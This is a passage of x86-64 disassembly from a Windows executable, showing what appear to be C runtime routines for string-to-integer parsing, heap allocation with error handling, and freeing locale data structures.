   140008153:	4d 85 f6             	test   %r14,%r14
   140008156:	75 2a                	jne    0x140008182
   140008158:	e8 47 af ff ff       	call   0x1400030a4
   14000815d:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140008163:	45 33 c9             	xor    %r9d,%r9d
   140008166:	45 33 c0             	xor    %r8d,%r8d
   140008169:	33 d2                	xor    %edx,%edx
   14000816b:	33 c9                	xor    %ecx,%ecx
   14000816d:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008173:	e8 5c ae ff ff       	call   0x140002fd4
   140008178:	80 7c 24 48 00       	cmpb   $0x0,0x48(%rsp)
   14000817d:	e9 e9 01 00 00       	jmp    0x14000836b
   140008182:	45 85 e4             	test   %r12d,%r12d
   140008185:	74 0c                	je     0x140008193
   140008187:	41 83 fc 02          	cmp    $0x2,%r12d
   14000818b:	7c cb                	jl     0x140008158
   14000818d:	41 83 fc 24          	cmp    $0x24,%r12d
   140008191:	7f c5                	jg     0x140008158
   140008193:	41 8a 2e             	mov    (%r14),%bpl
   140008196:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   14000819b:	33 ff                	xor    %edi,%edi
   14000819d:	49 8d 5e 01          	lea    0x1(%r14),%rbx
   1400081a1:	41 83 b8 0c 01 00 00 	cmpl   $0x1,0x10c(%r8)
   1400081a8:	01 
   1400081a9:	7e 1a                	jle    0x1400081c5
   1400081ab:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400081b0:	40 0f b6 cd          	movzbl %bpl,%ecx
   1400081b4:	ba 08 00 00 00       	mov    $0x8,%edx
   1400081b9:	e8 72 11 00 00       	call   0x140009330
   1400081be:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   1400081c3:	eb 12                	jmp    0x1400081d7
   1400081c5:	49 8b 80 40 01 00 00 	mov    0x140(%r8),%rax
   1400081cc:	40 0f b6 cd          	movzbl %bpl,%ecx
   1400081d0:	0f b7 04 48          	movzwl (%rax,%rcx,2),%eax
   1400081d4:	83 e0 08             	and    $0x8,%eax
   1400081d7:	85 c0                	test   %eax,%eax
   1400081d9:	74 08                	je     0x1400081e3
   1400081db:	40 8a 2b             	mov    (%rbx),%bpl
   1400081de:	48 ff c3             	inc    %rbx
   1400081e1:	eb be                	jmp    0x1400081a1
   1400081e3:	8b b4 24 90 00 00 00 	mov    0x90(%rsp),%esi
   1400081ea:	40 80 fd 2d          	cmp    $0x2d,%bpl
   1400081ee:	75 05                	jne    0x1400081f5
   1400081f0:	83 ce 02             	or     $0x2,%esi
   1400081f3:	eb 06                	jmp    0x1400081fb
   1400081f5:	40 80 fd 2b          	cmp    $0x2b,%bpl
   1400081f9:	75 06                	jne    0x140008201
   1400081fb:	40 8a 2b             	mov    (%rbx),%bpl
   1400081fe:	48 ff c3             	inc    %rbx
   140008201:	45 85 e4             	test   %r12d,%r12d
   140008204:	0f 88 53 01 00 00    	js     0x14000835d
   14000820a:	41 83 fc 01          	cmp    $0x1,%r12d
   14000820e:	0f 84 49 01 00 00    	je     0x14000835d
   140008214:	41 83 fc 24          	cmp    $0x24,%r12d
   140008218:	0f 8f 3f 01 00 00    	jg     0x14000835d
   14000821e:	45 85 e4             	test   %r12d,%r12d
   140008221:	75 28                	jne    0x14000824b
   140008223:	40 80 fd 30          	cmp    $0x30,%bpl
   140008227:	74 08                	je     0x140008231
   140008229:	41 bc 0a 00 00 00    	mov    $0xa,%r12d
   14000822f:	eb 38                	jmp    0x140008269
   140008231:	80 3b 78             	cmpb   $0x78,(%rbx)
   140008234:	74 0d                	je     0x140008243
   140008236:	80 3b 58             	cmpb   $0x58,(%rbx)
   140008239:	74 08                	je     0x140008243
   14000823b:	41 bc 08 00 00 00    	mov    $0x8,%r12d
   140008241:	eb 26                	jmp    0x140008269
   140008243:	41 bc 10 00 00 00    	mov    $0x10,%r12d
   140008249:	eb 0c                	jmp    0x140008257
   14000824b:	41 83 fc 10          	cmp    $0x10,%r12d
   14000824f:	75 18                	jne    0x140008269
   140008251:	40 80 fd 30          	cmp    $0x30,%bpl
   140008255:	75 12                	jne    0x140008269
   140008257:	80 3b 78             	cmpb   $0x78,(%rbx)
   14000825a:	74 05                	je     0x140008261
   14000825c:	80 3b 58             	cmpb   $0x58,(%rbx)
   14000825f:	75 08                	jne    0x140008269
   140008261:	40 8a 6b 01          	mov    0x1(%rbx),%bpl
   140008265:	48 83 c3 02          	add    $0x2,%rbx
   140008269:	4d 8b 90 40 01 00 00 	mov    0x140(%r8),%r10
   140008270:	33 d2                	xor    %edx,%edx
   140008272:	83 c8 ff             	or     $0xffffffff,%eax
   140008275:	41 f7 f4             	div    %r12d
   140008278:	44 8b c8             	mov    %eax,%r9d
   14000827b:	40 0f b6 cd          	movzbl %bpl,%ecx
   14000827f:	45 0f b7 04 4a       	movzwl (%r10,%rcx,2),%r8d
   140008284:	41 f6 c0 04          	test   $0x4,%r8b
   140008288:	74 09                	je     0x140008293
   14000828a:	40 0f be cd          	movsbl %bpl,%ecx
   14000828e:	83 e9 30             	sub    $0x30,%ecx
   140008291:	eb 1a                	jmp    0x1400082ad
   140008293:	41 f7 c0 03 01 00 00 	test   $0x103,%r8d
   14000829a:	74 2c                	je     0x1400082c8
   14000829c:	8d 45 9f             	lea    -0x61(%rbp),%eax
   14000829f:	40 0f be cd          	movsbl %bpl,%ecx
   1400082a3:	3c 19                	cmp    $0x19,%al
   1400082a5:	77 03                	ja     0x1400082aa
   1400082a7:	83 e9 20             	sub    $0x20,%ecx
   1400082aa:	83 c1 c9             	add    $0xffffffc9,%ecx
   1400082ad:	41 3b cc             	cmp    %r12d,%ecx
   1400082b0:	73 16                	jae    0x1400082c8
   1400082b2:	83 ce 08             	or     $0x8,%esi
   1400082b5:	41 3b f9             	cmp    %r9d,%edi
   1400082b8:	72 22                	jb     0x1400082dc
   1400082ba:	75 04                	jne    0x1400082c0
   1400082bc:	3b ca                	cmp    %edx,%ecx
   1400082be:	76 1c                	jbe    0x1400082dc
   1400082c0:	83 ce 04             	or     $0x4,%esi
   1400082c3:	4d 85 ed             	test   %r13,%r13
   1400082c6:	75 1a                	jne    0x1400082e2
   1400082c8:	48 ff cb             	dec    %rbx
   1400082cb:	40 f6 c6 08          	test   $0x8,%sil
   1400082cf:	75 19                	jne    0x1400082ea
   1400082d1:	4d 85 ed             	test   %r13,%r13
   1400082d4:	49 0f 45 de          	cmovne %r14,%rbx
   1400082d8:	33 ff                	xor    %edi,%edi
   1400082da:	eb 59                	jmp    0x140008335
   1400082dc:	41 0f af fc          	imul   %r12d,%edi
   1400082e0:	03 f9                	add    %ecx,%edi
   1400082e2:	40 8a 2b             	mov    (%rbx),%bpl
   1400082e5:	48 ff c3             	inc    %rbx
   1400082e8:	eb 91                	jmp    0x14000827b
   1400082ea:	bd ff ff ff 7f       	mov    $0x7fffffff,%ebp
   1400082ef:	40 f6 c6 04          	test   $0x4,%sil
   1400082f3:	75 1d                	jne    0x140008312
   1400082f5:	40 f6 c6 01          	test   $0x1,%sil
   1400082f9:	75 3a                	jne    0x140008335
   1400082fb:	8b c6                	mov    %esi,%eax
   1400082fd:	83 e0 02             	and    $0x2,%eax
   140008300:	74 08                	je     0x14000830a
   140008302:	81 ff 00 00 00 80    	cmp    $0x80000000,%edi
   140008308:	77 08                	ja     0x140008312
   14000830a:	85 c0                	test   %eax,%eax
   14000830c:	75 27                	jne    0x140008335
   14000830e:	3b fd                	cmp    %ebp,%edi
   140008310:	76 23                	jbe    0x140008335
   140008312:	e8 8d ad ff ff       	call   0x1400030a4
   140008317:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000831d:	40 f6 c6 01          	test   $0x1,%sil
   140008321:	74 05                	je     0x140008328
   140008323:	83 cf ff             	or     $0xffffffff,%edi
   140008326:	eb 0d                	jmp    0x140008335
   140008328:	40 8a c6             	mov    %sil,%al
   14000832b:	24 02                	and    $0x2,%al
   14000832d:	f6 d8                	neg    %al
   14000832f:	1b ff                	sbb    %edi,%edi
   140008331:	f7 df                	neg    %edi
   140008333:	03 fd                	add    %ebp,%edi
   140008335:	4d 85 ed             	test   %r13,%r13
   140008338:	74 04                	je     0x14000833e
   14000833a:	49 89 5d 00          	mov    %rbx,0x0(%r13)
   14000833e:	40 f6 c6 02          	test   $0x2,%sil
   140008342:	74 02                	je     0x140008346
   140008344:	f7 df                	neg    %edi
   140008346:	80 7c 24 48 00       	cmpb   $0x0,0x48(%rsp)
   14000834b:	74 0c                	je     0x140008359
   14000834d:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140008352:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140008359:	8b c7                	mov    %edi,%eax
   14000835b:	eb 1e                	jmp    0x14000837b
   14000835d:	4d 85 ed             	test   %r13,%r13
   140008360:	74 04                	je     0x140008366
   140008362:	4d 89 75 00          	mov    %r14,0x0(%r13)
   140008366:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   14000836b:	74 0c                	je     0x140008379
   14000836d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140008372:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   140008379:	33 c0                	xor    %eax,%eax
   14000837b:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   140008380:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140008384:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   140008388:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000838c:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140008390:	49 8b e3             	mov    %r11,%rsp
   140008393:	41 5e                	pop    %r14
   140008395:	41 5d                	pop    %r13
   140008397:	41 5c                	pop    %r12
   140008399:	c3                   	ret
   14000839a:	cc                   	int3
   14000839b:	cc                   	int3
   14000839c:	48 83 ec 38          	sub    $0x38,%rsp
   1400083a0:	33 c0                	xor    %eax,%eax
   1400083a2:	45 8b c8             	mov    %r8d,%r9d
   1400083a5:	4c 8b c2             	mov    %rdx,%r8
   1400083a8:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400083ac:	48 8b d1             	mov    %rcx,%rdx
   1400083af:	39 05 3b cf 00 00    	cmp    %eax,0xcf3b(%rip)        # 0x1400152f0
   1400083b5:	75 09                	jne    0x1400083c0
   1400083b7:	48 8d 0d 42 b4 00 00 	lea    0xb442(%rip),%rcx        # 0x140013800
   1400083be:	eb 02                	jmp    0x1400083c2
   1400083c0:	33 c9                	xor    %ecx,%ecx
   1400083c2:	e8 51 fd ff ff       	call   0x140008118
   1400083c7:	48 83 c4 38          	add    $0x38,%rsp
   1400083cb:	c3                   	ret
   1400083cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400083d1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400083d6:	57                   	push   %rdi
   1400083d7:	48 83 ec 40          	sub    $0x40,%rsp
   1400083db:	8b da                	mov    %edx,%ebx
   1400083dd:	48 8b d1             	mov    %rcx,%rdx
   1400083e0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400083e5:	41 8b f9             	mov    %r9d,%edi
   1400083e8:	41 8b f0             	mov    %r8d,%esi
   1400083eb:	e8 90 c2 ff ff       	call   0x140004680
   1400083f0:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400083f5:	44 0f b6 db          	movzbl %bl,%r11d
   1400083f9:	41 84 7c 03 1d       	test   %dil,0x1d(%r11,%rax,1)
   1400083fe:	75 1f                	jne    0x14000841f
   140008400:	85 f6                	test   %esi,%esi
   140008402:	74 15                	je     0x140008419
   140008404:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008409:	48 8b 88 40 01 00 00 	mov    0x140(%rax),%rcx
   140008410:	42 0f b7 04 59       	movzwl (%rcx,%r11,2),%eax
   140008415:	23 c6                	and    %esi,%eax
   140008417:	eb 02                	jmp    0x14000841b
   140008419:	33 c0                	xor    %eax,%eax
   14000841b:	85 c0                	test   %eax,%eax
   14000841d:	74 05                	je     0x140008424
   14000841f:	b8 01 00 00 00       	mov    $0x1,%eax
   140008424:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140008429:	74 0c                	je     0x140008437
   14000842b:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140008430:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140008437:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000843c:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140008441:	48 83 c4 40          	add    $0x40,%rsp
   140008445:	5f                   	pop    %rdi
   140008446:	c3                   	ret
   140008447:	cc                   	int3
   140008448:	8b d1                	mov    %ecx,%edx
   14000844a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140008450:	45 33 c0             	xor    %r8d,%r8d
   140008453:	33 c9                	xor    %ecx,%ecx
   140008455:	e9 72 ff ff ff       	jmp    0x1400083cc
   14000845a:	cc                   	int3
   14000845b:	cc                   	int3
   14000845c:	33 d2                	xor    %edx,%edx
   14000845e:	44 8d 42 0a          	lea    0xa(%rdx),%r8d
   140008462:	e9 35 ff ff ff       	jmp    0x14000839c
   140008467:	cc                   	int3
   140008468:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000846d:	57                   	push   %rdi
   14000846e:	48 83 ec 30          	sub    $0x30,%rsp
   140008472:	49 8b d8             	mov    %r8,%rbx
   140008475:	48 8b fa             	mov    %rdx,%rdi
   140008478:	48 85 c9             	test   %rcx,%rcx
   14000847b:	74 32                	je     0x1400084af
   14000847d:	33 d2                	xor    %edx,%edx
   14000847f:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140008483:	48 f7 f1             	div    %rcx
   140008486:	48 3b c7             	cmp    %rdi,%rax
   140008489:	73 24                	jae    0x1400084af
   14000848b:	e8 14 ac ff ff       	call   0x1400030a4
   140008490:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140008496:	45 33 c9             	xor    %r9d,%r9d
   140008499:	45 33 c0             	xor    %r8d,%r8d
   14000849c:	33 d2                	xor    %edx,%edx
   14000849e:	33 c9                	xor    %ecx,%ecx
   1400084a0:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400084a6:	e8 29 ab ff ff       	call   0x140002fd4
   1400084ab:	33 c0                	xor    %eax,%eax
   1400084ad:	eb 5d                	jmp    0x14000850c
   1400084af:	48 0f af f9          	imul   %rcx,%rdi
   1400084b3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400084b8:	48 85 ff             	test   %rdi,%rdi
   1400084bb:	48 0f 44 f8          	cmove  %rax,%rdi
   1400084bf:	33 c0                	xor    %eax,%eax
   1400084c1:	48 83 ff e0          	cmp    $0xffffffffffffffe0,%rdi
   1400084c5:	77 18                	ja     0x1400084df
   1400084c7:	48 8b 0d a2 cd 00 00 	mov    0xcda2(%rip),%rcx        # 0x140015270
   1400084ce:	8d 50 08             	lea    0x8(%rax),%edx
   1400084d1:	4c 8b c7             	mov    %rdi,%r8
   1400084d4:	ff 15 6e 5c 00 00    	call   *0x5c6e(%rip)        # 0x14000e148
   1400084da:	48 85 c0             	test   %rax,%rax
   1400084dd:	75 2d                	jne    0x14000850c
   1400084df:	83 3d 92 cd 00 00 00 	cmpl   $0x0,0xcd92(%rip)        # 0x140015278
   1400084e6:	74 19                	je     0x140008501
   1400084e8:	48 8b cf             	mov    %rdi,%rcx
   1400084eb:	e8 dc ae ff ff       	call   0x1400033cc
   1400084f0:	85 c0                	test   %eax,%eax
   1400084f2:	75 cb                	jne    0x1400084bf
   1400084f4:	48 85 db             	test   %rbx,%rbx
   1400084f7:	74 b2                	je     0x1400084ab
   1400084f9:	c7 03 0c 00 00 00    	movl   $0xc,(%rbx)
   1400084ff:	eb aa                	jmp    0x1400084ab
   140008501:	48 85 db             	test   %rbx,%rbx
   140008504:	74 06                	je     0x14000850c
   140008506:	c7 03 0c 00 00 00    	movl   $0xc,(%rbx)
   14000850c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008511:	48 83 c4 30          	add    $0x30,%rsp
   140008515:	5f                   	pop    %rdi
   140008516:	c3                   	ret
   140008517:	cc                   	int3
   140008518:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000851d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008522:	57                   	push   %rdi
   140008523:	48 83 ec 20          	sub    $0x20,%rsp
   140008527:	48 8b da             	mov    %rdx,%rbx
   14000852a:	48 8b f9             	mov    %rcx,%rdi
   14000852d:	48 85 c9             	test   %rcx,%rcx
   140008530:	75 0a                	jne    0x14000853c
   140008532:	48 8b ca             	mov    %rdx,%rcx
   140008535:	e8 66 a3 ff ff       	call   0x1400028a0
   14000853a:	eb 6a                	jmp    0x1400085a6
   14000853c:	48 85 d2             	test   %rdx,%rdx
   14000853f:	75 07                	jne    0x140008548
   140008541:	e8 d2 a4 ff ff       	call   0x140002a18
   140008546:	eb 5c                	jmp    0x1400085a4
   140008548:	48 83 fa e0          	cmp    $0xffffffffffffffe0,%rdx
   14000854c:	77 43                	ja     0x140008591
   14000854e:	48 8b 0d 1b cd 00 00 	mov    0xcd1b(%rip),%rcx        # 0x140015270
   140008555:	b8 01 00 00 00       	mov    $0x1,%eax
   14000855a:	48 85 db             	test   %rbx,%rbx
   14000855d:	48 0f 44 d8          	cmove  %rax,%rbx
   140008561:	4c 8b c7             	mov    %rdi,%r8
   140008564:	33 d2                	xor    %edx,%edx
   140008566:	4c 8b cb             	mov    %rbx,%r9
   140008569:	ff 15 41 5b 00 00    	call   *0x5b41(%rip)        # 0x14000e0b0
   14000856f:	48 8b f0             	mov    %rax,%rsi
   140008572:	48 85 c0             	test   %rax,%rax
   140008575:	75 6f                	jne    0x1400085e6
   140008577:	39 05 fb cc 00 00    	cmp    %eax,0xccfb(%rip)        # 0x140015278
   14000857d:	74 50                	je     0x1400085cf
   14000857f:	48 8b cb             	mov    %rbx,%rcx
   140008582:	e8 45 ae ff ff       	call   0x1400033cc
   140008587:	85 c0                	test   %eax,%eax
   140008589:	74 2b                	je     0x1400085b6
   14000858b:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000858f:	76 bd                	jbe    0x14000854e
   140008591:	48 8b cb             	mov    %rbx,%rcx
   140008594:	e8 33 ae ff ff       	call   0x1400033cc
   140008599:	e8 06 ab ff ff       	call   0x1400030a4
   14000859e:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400085a4:	33 c0                	xor    %eax,%eax
   1400085a6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400085ab:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400085b0:	48 83 c4 20          	add    $0x20,%rsp
   1400085b4:	5f                   	pop    %rdi
   1400085b5:	c3                   	ret
   1400085b6:	e8 e9 aa ff ff       	call   0x1400030a4
   1400085bb:	48 8b d8             	mov    %rax,%rbx
   1400085be:	ff 15 8c 5a 00 00    	call   *0x5a8c(%rip)        # 0x14000e050
   1400085c4:	8b c8                	mov    %eax,%ecx
   1400085c6:	e8 91 aa ff ff       	call   0x14000305c
   1400085cb:	89 03                	mov    %eax,(%rbx)
   1400085cd:	eb d5                	jmp    0x1400085a4
   1400085cf:	e8 d0 aa ff ff       	call   0x1400030a4
   1400085d4:	48 8b d8             	mov    %rax,%rbx
   1400085d7:	ff 15 73 5a 00 00    	call   *0x5a73(%rip)        # 0x14000e050
   1400085dd:	8b c8                	mov    %eax,%ecx
   1400085df:	e8 78 aa ff ff       	call   0x14000305c
   1400085e4:	89 03                	mov    %eax,(%rbx)
   1400085e6:	48 8b c6             	mov    %rsi,%rax
   1400085e9:	eb bb                	jmp    0x1400085a6
   1400085eb:	cc                   	int3
   1400085ec:	48 85 c9             	test   %rcx,%rcx
   1400085ef:	0f 84 e0 01 00 00    	je     0x1400087d5
   1400085f5:	53                   	push   %rbx
   1400085f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400085fa:	48 8b d9             	mov    %rcx,%rbx
   1400085fd:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140008601:	e8 12 a4 ff ff       	call   0x140002a18
   140008606:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   14000860a:	e8 09 a4 ff ff       	call   0x140002a18
   14000860f:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140008613:	e8 00 a4 ff ff       	call   0x140002a18
   140008618:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000861c:	e8 f7 a3 ff ff       	call   0x140002a18
   140008621:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140008625:	e8 ee a3 ff ff       	call   0x140002a18
   14000862a:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000862e:	e8 e5 a3 ff ff       	call   0x140002a18
   140008633:	48 8b 0b             	mov    (%rbx),%rcx
   140008636:	e8 dd a3 ff ff       	call   0x140002a18
   14000863b:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000863f:	e8 d4 a3 ff ff       	call   0x140002a18
   140008644:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140008648:	e8 cb a3 ff ff       	call   0x140002a18
   14000864d:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140008651:	e8 c2 a3 ff ff       	call   0x140002a18
   140008656:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   14000865a:	e8 b9 a3 ff ff       	call   0x140002a18
   14000865f:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   140008663:	e8 b0 a3 ff ff       	call   0x140002a18
   140008668:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   14000866c:	e8 a7 a3 ff ff       	call   0x140002a18
   140008671:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140008675:	e8 9e a3 ff ff       	call   0x140002a18
   14000867a:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   14000867e:	e8 95 a3 ff ff       	call   0x140002a18
   140008683:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140008687:	e8 8c a3 ff ff       	call   0x140002a18
   14000868c:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140008693:	e8 80 a3 ff ff       	call   0x140002a18
   140008698:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   14000869f:	e8 74 a3 ff ff       	call   0x140002a18
   1400086a4:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   1400086ab:	e8 68 a3 ff ff       	call   0x140002a18
   1400086b0:	48 8b 8b 98 00 00 00 	mov    0x98(%rbx),%rcx
   1400086b7:	e8 5c a3 ff ff       	call   0x140002a18
   1400086bc:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   1400086c3:	e8 50 a3 ff ff       	call   0x140002a18
   1400086c8:	48 8b 8b a8 00 00 00 	mov    0xa8(%rbx),%rcx
   1400086cf:	e8 44 a3 ff ff       	call   0x140002a18
   1400086d4:	48 8b 8b b0 00 00 00 	mov    0xb0(%rbx),%rcx
   1400086db:	e8 38 a3 ff ff       	call   0x140002a18
   1400086e0:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   1400086e7:	e8 2c a3 ff ff       	call   0x140002a18
   1400086ec:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   1400086f3:	e8 20 a3 ff ff       	call   0x140002a18
   1400086f8:	48 8b 8b c8 00 00 00 	mov    0xc8(%rbx),%rcx
   1400086ff:	e8 14 a3 ff ff       	call   0x140002a18
   140008704:	48 8b 8b d0 00 00 00 	mov    0xd0(%rbx),%rcx
   14000870b:	e8 08 a3 ff ff       	call   0x140002a18
   140008710:	48 8b 8b d8 00 00 00 	mov    0xd8(%rbx),%rcx
   140008717:	e8 fc a2 ff ff       	call   0x140002a18
   14000871c:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   140008723:	e8 f0 a2 ff ff       	call   0x140002a18
   140008728:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   14000872f:	e8 e4 a2 ff ff       	call   0x140002a18
   140008734:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   14000873b:	e8 d8 a2 ff ff       	call   0x140002a18
   140008740:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140008747:	e8 cc a2 ff ff       	call   0x140002a18
   14000874c:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   140008753:	e8 c0 a2 ff ff       	call   0x140002a18
   140008758:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   14000875f:	e8 b4 a2 ff ff       	call   0x140002a18
   140008764:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   14000876b:	e8 a8 a2 ff ff       	call   0x140002a18
   140008770:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   140008777:	e8 9c a2 ff ff       	call   0x140002a18
   14000877c:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   140008783:	e8 90 a2 ff ff       	call   0x140002a18
   140008788:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   14000878f:	e8 84 a2 ff ff       	call   0x140002a18
   140008794:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   14000879b:	e8 78 a2 ff ff       	call   0x140002a18
   1400087a0:	48 8b 8b 38 01 00 00 	mov    0x138(%rbx),%rcx
   1400087a7:	e8 6c a2 ff ff       	call   0x140002a18
   1400087ac:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   1400087b3:	e8 60 a2 ff ff       	call   0x140002a18
   1400087b8:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   1400087bf:	e8 54 a2 ff ff       	call   0x140002a18
   1400087c4:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   1400087cb:	e8 48 a2 ff ff       	call   0x140002a18
   1400087d0:	48 83 c4 20          	add    $0x20,%rsp
   1400087d4:	5b                   	pop    %rbx
   1400087d5:	c3                   	ret
   1400087d6:	cc                   	int3
   1400087d7:	cc                   	int3
   1400087d8:	48 85 c9             	test   %rcx,%rcx
   1400087db:	74 42                	je     0x14000881f
   1400087dd:	53                   	push   %rbx
   1400087de:	48 83 ec 20          	sub    $0x20,%rsp
   1400087e2:	48 8b d9             	mov    %rcx,%rbx
   1400087e5:	48 8b 09             	mov    (%rcx),%rcx
   1400087e8:	48 3b 0d c1 ba 00 00 	cmp    0xbac1(%rip),%rcx        # 0x1400142b0
   1400087ef:	74 05                	je     0x1400087f6
   1400087f1:	e8 22 a2 ff ff       	call   0x140002a18
   1400087f6:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400087fa:	48 3b 0d b7 ba 00 00 	cmp    0xbab7(%rip),%rcx        # 0x1400142b8
   140008801:	74 05                	je     0x140008808
   140008803:	e8 10 a2 ff ff       	call   0x140002a18
   140008808:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   14000880c:	48 3b 0d ad ba 00 00 	cmp    0xbaad(%rip),%rcx        # 0x1400142c0
   140008813:	74 05                	je     0x14000881a
   140008815:	e8 fe a1 ff ff       	call   0x140002a18
   14000881a:	48 83 c4 20          	add    $0x20,%rsp
   14000881e:	5b                   	pop    %rbx
   14000881f:	c3                   	ret
   140008820:	48 85 c9             	test   %rcx,%rcx
   140008823:	0f 84 8b 00 00 00    	je     0x1400088b4
   140008829:	53                   	push   %rbx
   14000882a:	48 83 ec 20          	sub    $0x20,%rsp
   14000882e:	48 8b d9             	mov    %rcx,%rbx
   140008831:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140008835:	48 3b 0d 8c ba 00 00 	cmp    0xba8c(%rip),%rcx        # 0x1400142c8
   14000883c:	74 05                	je     0x140008843
   14000883e:	e8 d5 a1 ff ff       	call   0x140002a18
   140008843:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140008847:	48 3b 0d 82 ba 00 00 	cmp    0xba82(%rip),%rcx        # 0x1400142d0
   14000884e:	74 05                	je     0x140008855
   140008850:	e8 c3 a1 ff ff       	call   0x140002a18
   140008855:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140008859:	48 3b 0d 78 ba 00 00 	cmp    0xba78(%rip),%rcx        # 0x1400142d8
   140008860:	74 05                	je     0x140008867
   140008862:	e8 b1 a1 ff ff       	call   0x140002a18
   140008867:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000886b:	48 3b 0d 6e ba 00 00 	cmp    0xba6e(%rip),%rcx        # 0x1400142e0
   140008872:	74 05                	je     0x140008879
   140008874:	e8 9f a1 ff ff       	call   0x140002a18
   140008879:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   14000887d:	48 3b 0d 64 ba 00 00 	cmp    0xba64(%rip),%rcx        # 0x1400142e8
   140008884:	74 05                	je     0x14000888b
   140008886:	e8 8d a1 ff ff       	call   0x140002a18
   14000888b:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000888f:	48 3b 0d 5a ba 00 00 	cmp    0xba5a(%rip),%rcx        # 0x1400142f0
   140008896:	74 05                	je     0x14000889d
   140008898:	e8 7b a1 ff ff       	call   0x140002a18
   14000889d:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   1400088a1:	48 3b 0d 50 ba 00 00 	cmp    0xba50(%rip),%rcx        # 0x1400142f8
   1400088a8:	74 05                	je     0x1400088af
   1400088aa:	e8 69 a1 ff ff       	call   0x140002a18
   1400088af:	48 83 c4 20          	add    $0x20,%rsp
   1400088b3:	5b                   	pop    %rbx
   1400088b4:	c3                   	ret
   1400088b5:	cc                   	int3
   1400088b6:	cc                   	int3
   1400088b7:	cc                   	int3
   1400088b8:	cc                   	int3
